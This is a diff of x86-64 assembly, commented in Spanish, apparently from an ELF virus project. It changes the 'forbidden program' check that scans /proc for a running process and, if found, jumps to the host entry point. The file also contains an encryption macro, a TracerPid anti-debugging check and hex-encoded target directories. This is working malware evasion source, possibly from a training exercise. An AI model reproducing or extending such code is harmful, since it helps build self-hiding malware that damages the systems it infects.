@@ -284,12 +284,12 @@ section .text
         ; esto puede pasar a menudo por permisos. Si sucede, seguimos.
         jle .cleanup_and_check_dir_in_proc
 
-        lea rdi, [forbidden_prog + 3]
+        lea rdi, [forbidden_prog + forbidden_prog_len]
         ; apuntamos con rsi al ultimo caracter de la cadena devuelta por readlink
         CALL_ENCRYPT(crazy)
         add rsi, rax
         dec rsi
-        mov rcx, 4
+        mov rcx, forbidden_prog_len
         std
         rep cmpsb
         ; si está el forbidden program corriendo, saltamos al entrypoint
@@ -305,8 +305,8 @@ section .text
         jmp .jump_to_host
 
     .cleanup_and_check_dir_in_proc:
-        add rsp, 256
-        jmp .check_dir_in_proc
+       add rsp, 256
+       jmp .check_dir_in_proc
 
     .check_tracerpid:
         ; abrimos /proc/self/status
@@ -657,7 +657,8 @@ section .text
     __F_data:
     tracerPid_str   db      0x54,0x72,0x61,0x63,0x65,0x72,0x50,0x69,0x64,0x3A,0x9  ;"TracerPid:",0x9 ; 11
     status_file     db      0x2F,0x70,0x72,0x6F,0x63,0x2F,0x73,0x65,0x6C,0x66,0x2F,0x73,0x74,0x61,0x74,0x75,0x73,0 ;"/proc/self/status",0 ; 18
-    forbidden_prog  db      0x2F,0x76,0x69,0x6D,0 ;"/vim",0  4
+    forbidden_prog  db      "/vim.basic"
+    forbidden_prog_len equ  $ - forbidden_prog - 1
     exe_string      db      0x2F,0x65,0x78,0x65,0 ;"/exe",0 ; 5
     dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
     proc            db      0x2F,0x70,0x72,0x6F,0x63,0x2f,0 ; "/proc/",0 ; 7
